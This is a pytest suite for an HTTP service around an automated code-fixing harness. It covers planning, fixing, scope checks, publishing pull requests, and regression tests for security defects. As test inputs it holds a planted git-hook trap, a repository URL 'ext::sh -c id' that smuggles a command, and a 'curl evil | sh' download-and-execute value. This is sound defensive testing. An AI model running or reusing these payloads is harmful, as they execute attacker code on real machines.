"""The HTTP service: plan, fix in the plan's checkout, scope check, publish.

The CLI is replaced by a small script that writes the artifacts a real run
writes, so these tests exercise everything the service owns -- checkout,
environment, snapshots, the scope gate, git and the GitHub call -- without a
model.
"""
from __future__ import annotations

import json
import subprocess
import sys
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from harness import service as S

FAKE_RUN = r'''
import json, os, pathlib, subprocess, time
repo = pathlib.Path(os.environ["REPO_PATH"])
out = repo / ".harness" / "run"
out.mkdir(parents=True, exist_ok=True)
info = repo / ".git" / "info"
info.mkdir(parents=True, exist_ok=True)
(info / "exclude").write_text(".harness/\n")
issue = os.environ["ISSUE"]
(out / "issue.json").write_text(json.dumps({"text": issue}))
(out / "scope.json").write_text(json.dumps({
    "fix_description": "clamp the bucket", "files_to_change":
    [{"path": "src/stats.js"}], "files_must_not_change": []}))
env = {k: os.environ.get(k, "") for k in
       ("HARNESS_DRY_RUN", "HARNESS_AUTO", "HARNESS_POST",
        "HARNESS_NONINTERACTIVE", "GITHUB_TOKEN", "HARNESS_SERVICE_RUN")}
(out / "rootcause.json").write_text(json.dumps({"env": env}))
if os.environ.get("HARNESS_DRY_RUN"):
    raise SystemExit(3)
if "SLOW" in issue:
    time.sleep(1.5)
target = "src/other.js" if "Change only: src/other.js" in issue else "src/stats.js"
if "TOUCH_README" in issue:
    target = "README.md"
if "NEW_FILE" in issue:
    # a file the fix creates: untracked, so `git diff HEAD` never lists it
    (repo / "src" / "helper.js").write_text("export const h = 1\n")
if "DOTFILE" in issue:
    (repo / ".github").mkdir(exist_ok=True)
    (repo / ".github" / "ci.yml").write_text("on: push\n")
    target = ".github/ci.yml"
if "COMMIT_LOCALLY" in issue:
    # what the CLI's _maybe_pr used to do in service mode (D-19)
    (repo / target).write_text("fixed\n")
    subprocess.run(["git", "add", "-A"], cwd=repo)
    subprocess.run(["git", "-c", "user.name=h", "-c", "user.email=h@h",
                    "commit", "-qm", "local"], cwd=repo)
if "PLANT_HOOK" in issue:
    # the repository's own code, run by the harness, leaving a trap behind
    hooks = repo / ".git" / "hooks"
    hooks.mkdir(parents=True, exist_ok=True)
    for name in ("pre-commit", "pre-push", "commit-msg"):
        hook = hooks / name
        hook.write_text("#!/bin/sh\necho pwned > " + os.environ["PWN_MARK"]
                        + "\nexit 1\n")
        hook.chmod(0o755)
    subprocess.run(["git", "config", "core.hooksPath", str(hooks)], cwd=repo)
(repo / target).parent.mkdir(parents=True, exist_ok=True)
(repo / target).write_text("fixed\n")
diff = subprocess.run(["git", "diff"], cwd=repo, capture_output=True,
                      text=True).stdout
if not diff:
    subprocess.run(["git", "add", "-N", target], cwd=repo)
    diff = subprocess.run(["git", "diff"], cwd=repo, capture_output=True,
                          text=True).stdout
(out / "diff.patch").write_text(json.dumps({"diff": diff}))
if "HARD_GATE_FAILS" in issue:
    (out / "confidence.json").write_text(json.dumps(
        {"existing_tests_pass": False, "no_unintended_changes": True,
         "diff_proportional": True}))
    (out / "verification.json").write_text(json.dumps(
        {"full": {"new": ["test_total"]}, "oracle_passes": None}))
    raise SystemExit(2)
if "SOFT_ONLY" in issue:
    (out / "confidence.json").write_text(json.dumps(
        {"existing_tests_pass": True, "no_unintended_changes": True,
         "diff_proportional": True, "root_cause_evidenced": False}))
    (out / "verification.json").write_text(json.dumps(
        {"full": {"new": []}, "oracle_passes": True}))
    raise SystemExit(2)
(out / "confidence.json").write_text(json.dumps({"band": "high"}))
raise SystemExit(0)
'''


def git(cwd, *args):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


@pytest.fixture
def upstream(tmp_path):
    work = tmp_path / "work"
    (work / "src").mkdir(parents=True)
    (work / "src" / "stats.js").write_text("broken\n")
    (work / "README.md").write_text("readme\n")
    git(work, "init", "-q", "-b", "main")
    git(work, "add", "-A")
    git(work, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
    bare = tmp_path / "origin.git"
    git(tmp_path, "clone", "-q", "--bare", str(work), str(bare))
    return bare


@pytest.fixture
def service(tmp_path):
    script = tmp_path / "fake_run.py"
    script.write_text(FAKE_RUN)
    # Local paths are a development opt-in; these tests are development.
    return S.Service(tmp_path / "home", workers=2,
                     command=[sys.executable, str(script)], allow_local=True)


def wait(service, run_id, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        run = service.get(run_id)
        if run.status in ("done", "failed", "cancelled"):
            return run
        time.sleep(0.05)
    raise AssertionError("run did not finish")


# -- pure helpers -------------------------------------------------------------
def test_changed_paths_and_scope_check():
    diff = ("diff --git a/src/a.js b/src/a.js\n--- a/src/a.js\n"
            "diff --git a/README.md b/README.md\n")
    assert S.changed_paths(diff) == ["src/a.js", "README.md"]
    assert S.check_scope(diff, {})["ok"]
    res = S.check_scope(diff, {"files": ["src/a.js"]})
    assert not res["ok"] and res["outside"] == ["README.md"]
    res = S.check_scope(diff, {"must_not": ["README.md"]})
    assert not res["ok"] and res["forbidden"] == ["README.md"]


def test_scoped_issue_carries_the_approval():
    text = S.scoped_issue("it breaks", {"files": ["a.py"], "must_not": ["b.py"],
                                        "constraints": "keep the API"})
    assert "Change only: a.py" in text and "Do not change: b.py" in text
    assert "keep the API" in text
    assert S.scoped_issue("it breaks", {}) == "it breaks"


def test_github_slug():
    assert S.github_slug("https://github.com/acme/app.git") == "acme/app"
    assert S.github_slug("git@github.com:acme/app") == "acme/app"
    assert S.github_slug("/tmp/x") is None


def test_token_never_reaches_argv():
    env = S.auth_env("sekret")
    assert "sekret" not in json.dumps(env)        # base64, in the environment
    assert env["GIT_CONFIG_KEY_0"] == "http.extraHeader"


# -- runs -------------------------------------------------------------------------
def test_plan_is_a_dry_run_that_publishes_nothing(service, upstream, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "must-not-leak")
    run = service.create({"mode": "plan", "issue": "buckets overlap",
                          "repo": {"path": str(upstream)}})
    run = wait(service, run.id)
    assert run.status == "done" and run.outcome == "NO_FIX"
    art = run.public(service.home)["artifacts"]
    assert art["scope"]["files_to_change"][0]["path"] == "src/stats.js"
    env = art["rootcause"]["env"]
    assert env == {"HARNESS_DRY_RUN": "1", "HARNESS_AUTO": "install",
                   "HARNESS_POST": "off", "HARNESS_NONINTERACTIVE": "1",
                   "GITHUB_TOKEN": "", "HARNESS_SERVICE_RUN": "1"}
    assert "checkout" not in run.public(service.home)


def test_fix_reuses_the_plan_checkout_and_passes_scope(service, upstream):
    plan = wait(service, service.create({
        "mode": "plan", "issue": "buckets overlap",
        "repo": {"path": str(upstream)}}).id)
    fix = wait(service, service.create({
        "mode": "fix", "from_run": plan.id,
        "scope": {"files": ["src/stats.js"]}}).id)
    assert fix.status == "done" and fix.exit_code == 0
    assert fix.checkout == plan.checkout
    assert fix.scope_check["ok"] and fix.scope_check["changed"] == ["src/stats.js"]
    # the plan's artifacts survive the fix run in the same checkout
    assert "diff" not in plan.public(service.home)["artifacts"]


def test_fix_outside_scope_is_flagged_and_cannot_publish(service, upstream):
    plan = wait(service, service.create({
        "mode": "plan", "issue": "TOUCH_README please",
        "repo": {"path": str(upstream)}}).id)
    fix = wait(service, service.create({
        "mode": "fix", "from_run": plan.id,
        "scope": {"files": ["src/stats.js"]}}).id)
    assert not fix.scope_check["ok"]
    assert fix.scope_check["outside"] == ["README.md"]
    with pytest.raises(S.RequestError) as err:
        service.publish(fix.id, {"token": "t", "branch": "b", "title": "x"})
    assert err.value.status == 409


def test_bad_requests(service, upstream):
    for body, status in [({"mode": "ship"}, 400),
                         ({"mode": "plan", "issue": "x"}, 400),
                         ({"mode": "plan", "repo": {"path": str(upstream)}}, 400),
                         ({"mode": "fix", "from_run": "nope"}, 404)]:
        with pytest.raises(S.RequestError) as err:
            service.create(body)
        assert err.value.status == status


def test_restart_marks_inflight_runs_failed(tmp_path):
    home = tmp_path / "home"
    (home / "runs" / "abc").mkdir(parents=True)
    (home / "runs" / "abc" / "state.json").write_text(json.dumps(
        {"id": "abc", "mode": "plan", "issue": "x", "status": "running"}))
    svc = S.Service(home)
    assert svc.get("abc").status == "failed"


# -- publish ------------------------------------------------------------------------
class _GitHub(BaseHTTPRequestHandler):
    calls: list = []

    def log_message(self, *a):
        pass

    def do_POST(self):
        size = int(self.headers["Content-Length"])
        _GitHub.calls.append((self.path, self.headers["Authorization"],
                              json.loads(self.rfile.read(size))))
        body = json.dumps({"html_url": "https://github.com/acme/app/pull/7",
                           "number": 7}).encode()
        self.send_response(201)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def test_publish_pushes_the_branch_and_opens_the_pr(service, upstream,
                                                    monkeypatch):
    httpd = HTTPServer(("127.0.0.1", 0), _GitHub)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    monkeypatch.setenv("GITHUB_API_URL", f"http://127.0.0.1:{httpd.server_port}")
    _GitHub.calls = []
    try:
        plan = wait(service, service.create({
            "mode": "plan", "issue": "buckets overlap",
            "repo": {"path": str(upstream)}}).id)
        fix = wait(service, service.create({"mode": "fix",
                                            "from_run": plan.id}).id)
        # a local "remote" standing in for github.com/acme/app
        monkeypatch.setattr(S, "github_slug", lambda url: "acme/app")
        out = service.publish(fix.id, {
            "token": "inst-token", "branch": "photon/fix-1",
            "title": "Clamp the bucket", "body": "on behalf of @priya",
            "reviewers": ["priya"], "trailers": ["On-behalf-of: @priya"]})
    finally:
        httpd.shutdown()
    assert out["number"] == 7 and out["base"] == "main"
    log = subprocess.run(["git", "log", "-1", "--format=%B", "photon/fix-1"],
                         cwd=upstream, capture_output=True, text=True).stdout
    assert "Clamp the bucket" in log and "On-behalf-of: @priya" in log
    paths = [c[0] for c in _GitHub.calls]
    assert paths == ["/repos/acme/app/pulls",
                     "/repos/acme/app/pulls/7/requested_reviewers"]
    assert _GitHub.calls[0][1] == "Bearer inst-token"
    assert service.publish(fix.id, {}) == out          # idempotent


# -- HTTP -------------------------------------------------------------------------
def test_http_requires_the_token(service):
    httpd = S.serve("127.0.0.1", 0, service, "tok")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"
    try:
        with urllib.request.urlopen(base + "/v1/health") as r:
            assert json.load(r)["ok"]
        with pytest.raises(urllib.error.HTTPError) as err:
            urllib.request.urlopen(base + "/v1/runs")
        assert err.value.code == 401
        req = urllib.request.Request(base + "/v1/runs",
                                     headers={"Authorization": "Bearer tok"})
        with urllib.request.urlopen(req) as r:
            assert json.load(r) == []
    finally:
        httpd.shutdown()


def test_refuses_public_bind_without_token(service):
    with pytest.raises(SystemExit):
        S.serve("0.0.0.0", 0, service, None)


# -- Phase 0 security floor ------------------------------------------------------
# Regression tests for the defects in ENTERPRISE_ARCHITECTURE.md, Appendix A.

@pytest.fixture
def github_api(monkeypatch):
    httpd = HTTPServer(("127.0.0.1", 0), _GitHub)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    monkeypatch.setenv("GITHUB_API_URL", f"http://127.0.0.1:{httpd.server_port}")
    # the local bare "remote" stands in for github.com/acme/app
    monkeypatch.setattr(S, "github_slug", lambda url: "acme/app")
    _GitHub.calls = []
    yield _GitHub.calls
    httpd.shutdown()


def plan_and_fix(service, upstream, issue, scope=None):
    plan = wait(service, service.create({
        "mode": "plan", "issue": issue, "repo": {"path": str(upstream)}}).id)
    fix = wait(service, service.create({
        "mode": "fix", "from_run": plan.id, "scope": scope or {}}).id)
    return plan, fix


def branch_file(upstream, branch, path):
    return subprocess.run(["git", "show", f"{branch}:{path}"], cwd=upstream,
                          capture_output=True, text=True)


PUBLISH = {"token": "inst-token", "branch": "photon/fix-1", "title": "Fix it"}


def test_d19_a_run_that_committed_locally_still_publishes(service, upstream,
                                                          github_api):
    """D-19: the CLI used to commit in service mode, so /publish's own
    `git commit` failed with "nothing to commit" on every successful run."""
    plan, fix = plan_and_fix(service, upstream, "COMMIT_LOCALLY please")
    assert fix.exit_code == 0 and fix.scope_check["ok"]
    assert fix.scope_check["changed"] == ["src/stats.js"]
    out = service.publish(fix.id, dict(PUBLISH))
    assert out["number"] == 7
    assert branch_file(upstream, "photon/fix-1", "src/stats.js").stdout \
        == "fixed\n"


def test_d19_a_service_run_never_opens_a_pull_request_itself(monkeypatch):
    from harness import __main__ as M
    from harness import pullrequest as PR
    called = []
    monkeypatch.setattr(PR, "open_pr", lambda *a, **k: called.append(a))

    class Cfg:
        _root_cause = object()

    monkeypatch.setattr(M, "_publishable", lambda cfg, code: "")
    monkeypatch.setenv("HARNESS_SERVICE_RUN", "1")
    M._maybe_pr(Cfg(), None, None, 0)
    assert called == [], "service mode committed and tried to push by itself"


def test_d20_a_partial_run_with_a_failed_hard_gate_is_not_published(
        service, upstream, github_api):
    plan, fix = plan_and_fix(service, upstream, "HARD_GATE_FAILS")
    assert fix.exit_code == 2 and fix.scope_check["ok"]
    with pytest.raises(S.RequestError) as err:
        service.publish(fix.id, dict(PUBLISH))
    assert err.value.status == 409
    assert "existing_tests_pass" in str(err.value)
    assert github_api == [], "a pull request was opened anyway"


def test_d20_a_partial_run_failing_only_a_soft_condition_publishes(
        service, upstream, github_api):
    """The same bar as the CLI: hard gates, not the exit code."""
    plan, fix = plan_and_fix(service, upstream, "SOFT_ONLY")
    assert fix.exit_code == 2
    assert service.publish(fix.id, dict(PUBLISH))["number"] == 7


def test_d20_the_rule_reads_the_run_artifacts_like_the_records():
    from harness import exits
    ok = {"existing_tests_pass": True, "no_unintended_changes": True,
          "diff_proportional": True}
    assert exits.publish_refusal(exits.PARTIAL, ok, {"full": {"new": []}}) == ""
    assert "new test failure" in exits.publish_refusal(
        exits.PARTIAL, ok, {"scoped": {"new": ["t1"]}})
    assert "reproduction" in exits.publish_refusal(
        exits.PARTIAL, ok, {"oracle_passes": False})
    assert exits.publish_refusal(exits.PARTIAL, {}, {})     # nothing to judge
    assert exits.publish_refusal(exits.NO_FIX, ok, {})


def test_d21_publish_never_runs_hooks_planted_in_the_checkout(
        service, upstream, github_api, tmp_path, monkeypatch):
    """D-21: the repository's code can plant hooks and config in the run's
    checkout. Publishing there ran them with the caller's write token."""
    mark = tmp_path / "pwned"
    monkeypatch.setenv("PWN_MARK", str(mark))
    monkeypatch.setenv("AI_API_KEY", "sk-ant-api03-FAKESERVICE1234567890")
    seen = []
    real_git = S.git

    def spy(args, cwd, token=None, **kw):
        seen.append((list(args), str(cwd), token,
                     S.git_env({**S.auth_env(token), **(kw.get("env") or {})})))
        return real_git(args, cwd, token, **kw)

    monkeypatch.setattr(S, "git", spy)
    plan, fix = plan_and_fix(service, upstream, "PLANT_HOOK please")
    out = service.publish(fix.id, dict(PUBLISH))

    assert not mark.exists(), "a hook from the run's checkout ran"
    assert branch_file(upstream, "photon/fix-1", "src/stats.js").stdout \
        == "fixed\n"
    # the checkout was only read, and never with the token
    for args, cwd, token, env in seen:
        if cwd.startswith(str(Path(fix.checkout))):
            assert token is None and "GIT_CONFIG_VALUE_0" not in env, args
            assert args[0] not in ("commit", "push", "checkout"), args
    # the service's own secrets are not in any git environment
    assert all("AI_API_KEY" not in env for *_, env in seen)
    import hashlib
    patch, _ = S.make_patch(Path(fix.checkout), fix.base)
    assert out["patch_sha256"] == hashlib.sha256(patch).hexdigest()
    assert out["patch_sha256"] == fix.scope_check["patch_sha256"]


def test_d21_a_checkout_changed_after_the_scope_check_is_refused(
        service, upstream, github_api):
    """What goes out is exactly what the scope check approved."""
    plan, fix = plan_and_fix(service, upstream, "buckets overlap")
    (Path(fix.checkout) / "src" / "stats.js").write_text("something else\n")
    with pytest.raises(S.RequestError) as err:
        service.publish(fix.id, dict(PUBLISH))
    assert err.value.status == 409 and "changed" in str(err.value)


def test_d33_a_new_file_is_in_the_scope_check(service, upstream):
    """`git diff HEAD` never lists an untracked file, so a file the fix
    created passed the scope check and was then published."""
    plan, fix = plan_and_fix(service, upstream, "NEW_FILE please",
                             scope={"files": ["src/stats.js"]})
    assert "src/helper.js" in fix.scope_check["changed"]
    assert fix.scope_check["outside"] == ["src/helper.js"]
    assert not fix.scope_check["ok"]


def test_d33_dotfiles_are_compared_as_themselves(service, upstream):
    plan, fix = plan_and_fix(service, upstream, "DOTFILE please",
                             scope={"files": ["./.github/ci.yml"]})
    assert fix.scope_check["changed"] == [".github/ci.yml"]
    assert fix.scope_check["ok"]
    res = S.check_scope("", {"must_not": [".github/ci.yml"]},
                        [".github/ci.yml"])
    assert res["forbidden"] == [".github/ci.yml"], \
        "`lstrip('./')` turned .github into github and protected nothing"


def test_d36_a_caller_cannot_name_a_local_repository(tmp_path, upstream):
    svc = S.Service(tmp_path / "strict", allow_local=False)
    for repo in ({"path": str(upstream)}, {"url": str(upstream)},
                 {"url": f"file://{upstream}"}, {"url": "ext::sh -c id"},
                 {"url": "git@github.com:acme/app.git"},
                 {"url": "https://x-access-token:t@github.com/acme/app"}):
        with pytest.raises(S.RequestError) as err:
            svc.create({"mode": "plan", "issue": "x", "repo": repo})
        assert err.value.status == 400, repo
    assert svc.runs == {}


def test_d36_a_caller_cannot_set_the_test_or_lint_command(service, upstream):
    run = service.create({
        "mode": "plan", "issue": "x", "repo": {"path": str(upstream)},
        "env": {"HARNESS_TEST_CMD": "curl evil | sh",
                "HARNESS_LINT_CMD": "id", "HARNESS_MAX_CYCLES": "2"}})
    assert run.env == {"HARNESS_MAX_CYCLES": "2"}
    wait(service, run.id)


def test_d36_one_checkout_is_claimed_by_one_fix_run(service, upstream):
    """The check and the claim are one step: two requests arriving together
    used to both find the checkout free."""
    plan = wait(service, service.create({
        "mode": "plan", "issue": "x", "repo": {"path": str(upstream)}}).id)
    barrier = threading.Barrier(4)
    results = []

    def claim():
        barrier.wait()
        try:
            results.append(service.create({"mode": "fix", "issue": "SLOW",
                                           "from_run": plan.id}).id)
        except S.RequestError as exc:
            results.append(exc.status)

    threads = [threading.Thread(target=claim) for _ in range(4)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    started = [r for r in results if isinstance(r, str)]
    assert len(started) == 1 and results.count(409) == 3, results
    wait(service, started[0])


# -- the real CLI, not the fake ----------------------------------------------------
REAL_RUN = r'''
import sys
sys.path[:0] = [{root!r}, {tests!r}]
import mock_model


class _Patch:                      # mock_model.install wants a monkeypatch
    def setattr(self, obj, name, value):
        setattr(obj, name, value)


mock_model.install(_Patch())
from harness.__main__ import main
sys.exit(main(["harness"]))
'''


def test_a_real_cli_run_through_the_service_publishes(tmp_path, monkeypatch,
                                                      github_api):
    """D-19 end to end, with the real pipeline behind the service.

    The "remote" lives under a path containing github.com/acme/app, so the
    CLI's own pull-request code recognises it as GitHub -- which is exactly
    when it used to commit in the service's checkout and leave /publish
    nothing to commit.
    """
    fixture = ROOT / "tests" / "fixtures" / "py-offbyone"
    if not fixture.is_dir():
        pytest.skip("fixtures not generated")
    upstream = tmp_path / "github.com" / "acme" / "app.git"
    upstream.parent.mkdir(parents=True)
    git(tmp_path, "clone", "-q", "--bare", str(fixture), str(upstream))
    script = tmp_path / "real_run.py"
    script.write_text(REAL_RUN.format(root=str(ROOT),
                                      tests=str(ROOT / "tests")))
    meta = json.loads((fixture / ".fixture.json").read_text())
    monkeypatch.setenv("AI_API_KEY", "sk-ant-api03-MOCK1234567890")
    monkeypatch.setenv("HARNESS_NO_CACHE", "1")
    for k in ("REPO_PATH", "HARNESS_DRY_RUN", "HARNESS_TASK_TYPE",
              "HARNESS_ROUTE", "ISSUE_FILE", "HARNESS_AUTO"):
        monkeypatch.delenv(k, raising=False)

    svc = S.Service(tmp_path / "home", workers=1,
                    command=[sys.executable, str(script)], allow_local=True)
    plan = wait(svc, svc.create({"mode": "plan", "issue": meta["issue"],
                                 "repo": {"path": str(upstream)}}).id, 300)
    assert plan.status == "done" and plan.outcome == "NO_FIX", \
        svc.log_tail(plan.id, 40)
    fix = wait(svc, svc.create({"mode": "fix", "from_run": plan.id}).id, 300)
    assert fix.exit_code == 0, svc.log_tail(fix.id, 60)
    head = subprocess.run(["git", "rev-parse", "HEAD"], cwd=fix.checkout,
                          capture_output=True, text=True).stdout.strip()
    assert head == fix.base, "the CLI committed in the service's checkout"
    assert fix.scope_check["ok"], fix.scope_check

    out = svc.publish(fix.id, dict(PUBLISH))
    assert out["number"] == 7 and out["patch_sha256"]
    shown = subprocess.run(["git", "diff", "--name-only", "main",
                            "photon/fix-1"], cwd=upstream,
                           capture_output=True, text=True).stdout.split()
    assert shown == fix.scope_check["changed"] != []
